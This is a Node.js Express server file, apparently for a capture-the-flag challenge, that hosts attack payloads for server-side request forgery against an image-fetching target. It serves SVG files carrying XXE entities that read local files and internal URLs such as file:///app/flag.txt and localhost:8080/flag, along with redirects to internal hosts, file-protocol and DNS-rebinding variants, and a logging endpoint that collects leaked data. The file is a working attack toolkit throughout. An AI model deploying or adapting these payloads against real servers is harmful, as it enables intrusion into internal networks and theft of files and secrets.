const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Test endpoint to check if server is fetching
app.get('/test', (req, res) => {
  console.log('TEST REQUEST - Server is calling us!', {
    timestamp: new Date().toISOString(),
    headers: req.headers,
    ip: req.ip,
    userAgent: req.get('User-Agent')
  });
  res.json({ status: 'test', message: 'Server is fetching images' });
});

// 1. XXE Injection in SVG
app.get('/xxe.svg', (req, res) => {
  console.log('XXE SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://localhost:8080/flag">
  <!ENTITY xxe2 SYSTEM "http://127.0.0.1:8080/flag">
  <!ENTITY xxe3 SYSTEM "http://localhost:5000/flag">
  <!ENTITY xxe4 SYSTEM "http://127.0.0.1:5000/flag">
  <!ENTITY xxe5 SYSTEM "file:///flag.txt">
  <!ENTITY xxe6 SYSTEM "file:///app/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="red"/>
  <text x="10" y="20" font-size="4">&xxe;&xxe2;&xxe3;&xxe4;&xxe5;&xxe6;</text>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});

// 2. SVG with external image reference
app.get('/external-image.svg', (req, res) => {
  console.log('External image SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="http://localhost:8080/flag" width="100" height="100"/>
  <rect width="100" height="100" fill="red" opacity="0.5"/>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});

// 3. Redirect to internal endpoints
app.get('/redirect-internal', (req, res) => {
  console.log('Redirect to internal requested');
  res.redirect('http://localhost:8080/flag');
});

app.get('/redirect-internal2', (req, res) => {
  console.log('Redirect to internal2 requested');
  res.redirect('http://127.0.0.1:8080/flag');
});

// 4. Protocol-based SSRF
app.get('/file-protocol.svg', (req, res) => {
  console.log('File protocol SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="file:///flag.txt" width="100" height="100"/>
  <rect width="100" height="100" fill="blue" opacity="0.5"/>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});

// 5. DNS rebinding technique
app.get('/dns-rebind.svg', (req, res) => {
  console.log('DNS rebind SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="http://localhost:8080/flag" width="100" height="100"/>
  <image href="http://127.0.0.1.xip.io/flag" width="100" height="100"/>
  <rect width="100" height="100" fill="green" opacity="0.5"/>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});

// Log endpoint
app.get('/log', (req, res) => {
  console.log('POTENTIAL FLAG DATA:', {
    timestamp: new Date().toISOString(),
    query: req.query,
    headers: req.headers,
    ip: req.ip
  });
  res.json({ status: 'logged', data: req.query });
});

// Main page with all options
app.get('/', (req, res) => {
  const baseUrl = `https://${req.get('host')}`;
  res.send(`
    <h1>SSRF Attack Endpoints</h1>
    <p>Use these URLs in your image_url parameter:</p>
    <ul>
      <li><strong>XXE Injection:</strong> ${baseUrl}/xxe.svg</li>
      <li><strong>External Image:</strong> ${baseUrl}/external-image.svg</li>
      <li><strong>Redirect Internal:</strong> ${baseUrl}/redirect-internal</li>
      <li><strong>Redirect Internal2:</strong> ${baseUrl}/redirect-internal2</li>
      <li><strong>File Protocol:</strong> ${baseUrl}/file-protocol.svg</li>
      <li><strong>DNS Rebind:</strong> ${baseUrl}/dns-rebind.svg</li>
      <li><strong>Test:</strong> ${baseUrl}/test</li>
    </ul>
  `);
});

app.listen(PORT, () => {
  console.log(`SSRF server running on port ${PORT}`);
  console.log('Try these endpoints in your attack:');
  console.log('1. /xxe.svg - XXE Injection');
  console.log('2. /external-image.svg - External image reference');
  console.log('3. /redirect-internal - Redirect to localhost');
  console.log('4. /file-protocol.svg - File protocol SSRF');
  console.log('5. /dns-rebind.svg - DNS rebinding');
  console.log('6. /test - Test if server is fetching');
});
